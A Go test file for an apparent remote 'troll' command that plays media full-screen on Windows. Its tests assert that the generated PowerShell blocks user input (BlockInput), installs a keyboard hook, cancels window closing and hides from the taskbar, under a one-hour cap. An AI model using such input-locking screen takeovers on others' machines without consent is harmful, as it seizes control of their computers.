package commands

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestPlayTrollUsage(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("non-windows refusal path only")
	}
	if _, err := playTroll(""); err == nil || !strings.Contains(err.Error(), "not supported") {
		t.Fatalf("err = %v, want not supported", err)
	}
	if _, err := stopTroll(); err == nil || !strings.Contains(err.Error(), "not supported") {
		t.Fatalf("stop err = %v, want not supported", err)
	}
}

func TestTrollScriptSafetyMarkers(t *testing.T) {
	// Video path must contain every safety rail: hard timeout, BlockInput
	// off on close, no taskbar, topmost, MediaFailed unblock.
	script, err := trollScript(`C:\m\v.mp4`, ".mp4", 300, true, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"BlockInput($false)",
		"BlockInput($true)",
		"ShowInTaskbar = $false",
		"Topmost = $true",
		"WindowStyle = 'None'",
		"MediaFailed",
		"Add_Closed",
		// Lockdown rails (v1.46.1): close-cancel, key hook, re-assert.
		"allowClose",
		"Cancel = $true",
		"SetWindowsHookEx",
		"Uninstall()",
		// Playback proof (v1.46.1): status handshake + no-proof watchdog.
		"MediaOpened",
		"timeout-no-media",
		"failed: ",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("video script missing safety marker %q", want)
		}
	}
	if strings.Contains(script, `"C:`) {
		t.Fatalf("path double-quoted")
	}

	gscript, err := trollScript(`C:\m\loop.gif`, ".gif", 60, false, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"BlockInput($false)",
		"BlockInput($true)",
		"TopMost = $true",
		"ShowInTaskbar = $false",
		"FormBorderStyle = 'None'",
		"Add_FormClosed",
		// Lockdown rails (v1.46.1).
		"allowClose",
		"Cancel = $true",
		"SetWindowsHookEx",
		"Uninstall()",
		"Add_FormClosing",
		// Playback proof (v1.46.1).
		"'opened'",
		"failed: ",
	} {
		if !strings.Contains(gscript, want) {
			t.Fatalf("gif script missing safety marker %q", want)
		}
	}
}

func TestTrollSecondsClampLogic(t *testing.T) {
	// playTroll clamps via maxTrollSeconds; assert the constants hold.
	if defaultTrollSeconds <= 0 || defaultTrollSeconds > maxTrollSeconds {
		t.Fatalf("default %d max %d", defaultTrollSeconds, maxTrollSeconds)
	}
	if maxTrollSeconds != 3600 {
		t.Fatalf("maxTrollSeconds = %d, want 3600 (1h hard cap)", maxTrollSeconds)
	}
}

func TestTrollExtKind(t *testing.T) {
	for _, ext := range []string{".mp4", ".mov", ".avi", ".wmv", ".mkv", ".webm", ".m4v", ".mpg", ".mp3", ".wav", ".wma", ".m4a"} {
		if trollExtKind(ext) != "video" {
			t.Fatalf("%s should be video", ext)
		}
	}
	for _, ext := range []string{".gif", ".png", ".jpg", ".jpeg", ".bmp"} {
		if trollExtKind(ext) != "image" {
			t.Fatalf("%s should be image", ext)
		}
	}
	for _, ext := range []string{"", ".dat", ".exe", ".ps1", ".txt"} {
		if trollExtKind(ext) != "" {
			t.Fatalf("%s should be rejected", ext)
		}
	}
}

func TestTrollExtForContentType(t *testing.T) {
	cases := map[string]string{
		"video/mp4": "mp4", "image/gif": "gif", "image/png": "png",
		"video/x-matroska": "mkv", "text/html": "",
		"video/mp4; charset=binary": "mp4",
	}
	for ct, want := range cases {
		got := trollExtForContentType(ct)
		if want == "" && got != "" {
			t.Fatalf("%s should map to nothing, got %s", ct, got)
		}
		if want != "" && got != "."+want {
			t.Fatalf("%s mapped to %s, want .%s", ct, got, want)
		}
	}
}

// Still images must ride the WinForms branch (PictureBox), never WPF
// MediaElement (which never raises MediaOpened for a still — the exact
// failure behind "troll media failed: timeout-no-media" on a .jpg).
func TestTrollStillsUseWinForms(t *testing.T) {
	for _, ext := range []string{".jpg", ".jpeg", ".bmp", ".png", ".gif"} {
		s, err := trollScript(`C:\m\pic`+ext, ext, 60, true, `C:\m\status.txt`)
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(s, "PictureBox") {
			t.Fatalf("%s script missing WinForms PictureBox", ext)
		}
		if strings.Contains(s, "MediaElement") {
			t.Fatalf("%s script wrongly uses WPF MediaElement", ext)
		}
	}
	v, err := trollScript(`C:\m\v.mp4`, ".mp4", 60, true, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(v, "MediaElement") {
		t.Fatal("mp4 script missing WPF MediaElement")
	}
	a, err := trollScript(`C:\m\s.mp3`, ".mp3", 60, true, `C:\m\status.txt`)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(a, "MediaElement") {
		t.Fatal("mp3 script missing WPF MediaElement (audio rides the media pipeline)")
	}
	if !strings.Contains(a, "MediaOpened") {
		t.Fatal("mp3 script missing MediaOpened proof handshake")
	}
}

func TestSniffMP4Codec(t *testing.T) {
	mk := func(payload string) string {
		p := filepath.Join(t.TempDir(), "s.mp4")
		// Minimal ftyp box: size(4) "ftyp" major(4) minor(4) + brands.
		box := []byte{0, 0, 0, 32, 'f', 't', 'y', 'p', 'i', 's', 'o', 'm', 0, 0, 0, 0}
		box = append(box, []byte(payload)...)
		if err := os.WriteFile(p, box, 0644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	if got := sniffMP4Codec(mk("avc1....")); got != "h264" {
		t.Fatalf("avc1 = %q, want h264", got)
	}
	if got := sniffMP4Codec(mk("hvc1....")); got != "hevc" {
		t.Fatalf("hvc1 = %q, want hevc", got)
	}
	if got := sniffMP4Codec(mk("vp09....")); got != "vp9" {
		t.Fatalf("vp09 = %q, want vp9", got)
	}
	if got := sniffMP4Codec(filepath.Join(t.TempDir(), "missing.mp4")); got != "" {
		t.Fatalf("missing file = %q, want empty", got)
	}
}
